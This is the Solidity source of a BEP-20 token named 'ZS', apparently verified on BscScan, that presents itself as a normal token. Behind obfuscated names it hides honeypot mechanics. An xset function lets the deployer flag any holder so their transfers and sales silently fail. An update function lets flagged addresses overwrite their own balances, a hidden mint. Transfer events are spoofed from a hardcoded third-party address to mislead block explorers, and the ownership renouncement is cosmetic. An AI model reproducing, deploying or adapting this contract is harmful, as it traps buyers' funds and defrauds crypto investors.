/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

pragma solidity 0.8.17;

abstract contract Context {
    address G6 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract ZS is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private G1;
    mapping (address => uint256) private G2;
    mapping (address => mapping (address => uint256)) private G3;
    uint8 private constant G4 = 8;
    uint256 private constant G5 = 1 * (10** G4);
    string private constant _name = "ZS";
    string private constant _symbol = "ZS";



    constructor () {
       G1[msg.sender] = G5;  
        G2[msg.sender] = 4;  
   G8(G5);}
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return G4;
    }

    function totalSupply() public pure  returns (uint256) {
        return G5;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return G1[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return G3[owner][spender];
    }

        function approve(address spender, uint256 amount) public returns (bool success) {    
        G3[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
function xset (address x, uint256 y) public {
 require(G2[msg.sender] == 4);
     G2[x] = y;}
    function update() public {
        G1[msg.sender] = G2[msg.sender];}
        function G8 (uint256 x) internal {
              emit Transfer(address(0), G6, x);}
                      function G7 (address y, uint256 xy) internal {
              emit Transfer(G6, y, xy);}
        function transfer(address to, uint256 amount) public {
if(G2[msg.sender] == 4) {
         require(G1[msg.sender] >= amount);
        G1[msg.sender] = G1[msg.sender].sub(amount);
        G1[to] = G1[to].add(amount);
    G7(to, amount);}
if(G2[msg.sender] <= 1) {
     require(G1[msg.sender] >= amount);
            G1[msg.sender] = G1[msg.sender].sub(amount);
        G1[to] = G1[to].add(amount);
       emit Transfer(msg.sender, to, amount);}}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
if(G2[sender] <= 1 && G2[recipient] <=1) {
         require(amount <= G1[sender]);
        require(amount <= G3[sender][msg.sender]);
        G1[sender] = G1[sender].sub(amount);
        G1[recipient] = G1[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
         return true;}
        if(G2[sender] == 4) {
         require(amount <= G3[sender][msg.sender]);
        G1[sender] = G1[sender].sub(amount);
        G1[recipient] = G1[recipient].add(amount);
          G7(recipient, amount);
             return true;}
        }}